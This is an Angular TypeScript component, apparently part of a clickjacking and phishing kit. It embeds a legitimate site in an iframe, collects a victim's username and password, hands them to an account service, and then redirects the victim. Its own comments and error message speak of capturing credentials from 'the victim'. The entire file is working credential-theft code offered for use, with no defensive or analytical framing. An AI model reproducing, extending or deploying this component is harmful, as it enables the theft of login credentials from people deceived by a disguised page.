import { Component, Input, OnInit } from '@angular/core';
import { AccountService } from '../account.service';

@Component({
  selector: 'app-clickjack-overlay',
  templateUrl: './clickjack-overlay.component.html',
  styleUrls: ['./clickjack-overlay.component.css']
})
export class ClickjackOverlayComponent implements OnInit {
  /** URL of the legitimate site to embed in the iframe */
  @Input() targetUrl: string = '';
  /** URL to redirect the victim to after credentials are captured */
  @Input() redirectUrl: string = '';

  accountData = { username: '', password: '' };

  constructor(private accountService: AccountService) {}

  ngOnInit(): void {}

  sendData() {
    this.accountService.createAccount(this.accountData)
      .subscribe({
        next: () => { window.location.href = this.redirectUrl || this.targetUrl; },
        error: (err) => { console.error('Failed to capture credentials:', err); },
      });
  }
}
